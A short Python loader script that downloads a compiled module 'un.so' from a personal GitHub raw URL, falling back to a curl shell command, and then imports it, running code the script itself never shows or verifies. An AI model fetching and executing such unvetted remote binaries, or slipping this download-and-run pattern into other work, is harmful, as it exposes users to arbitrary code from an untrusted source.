import os
import sys

GITHUB_SO_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/wi/refs/heads/main/un.so"

if not os.path.exists("un.so"):
    print("[*] Downloading required components (un.so)...")
    try:
        import requests
        response = requests.get(GITHUB_SO_URL, stream=True)
        if response.status_code == 200:
            with open("un.so", "wb") as f:
                f.write(response.content)
            print("[+] Download complete successfully.")
        else:
            os.system(f'curl -L -o un.so "{GITHUB_SO_URL}"')
    except Exception:
        os.system(f'curl -L -o un.so "{GITHUB_SO_URL}"')

try:
    import un
except ImportError as e:
    print(f"[-] Import Error: {e}")
    print("[!] Please make sure your Python version matches the compiled .so file version.")
